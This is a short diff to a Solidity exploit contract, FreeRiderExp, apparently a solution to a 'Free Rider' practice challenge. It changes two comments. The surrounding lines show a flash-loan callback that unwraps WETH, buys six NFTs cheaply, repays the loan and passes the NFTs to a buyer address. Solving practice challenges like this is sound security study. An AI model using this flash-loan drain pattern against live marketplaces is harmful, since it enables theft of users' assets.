@@ -34,7 +34,7 @@ contract FreeRiderExp is IUniswapV2Callee, IERC721Receiver {
     }
     
     function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
-       // convert eth to eth
+       // convert weth to eth
        weth.withdraw(amount0); 
        
        // buy 6 NFT for 15 ether
@@ -69,7 +69,7 @@ contract FreeRiderExp is IUniswapV2Callee, IERC721Receiver {
        // return the flashloan
        weth.transfer(msg.sender, returnAmount);
        
-       // give NFTs to attacker
+       // give NFTs to buyer 
        for (uint i = 0; i < 6; i++) {
            dvnft.safeTransferFrom(address(this), buyer, i);
        }
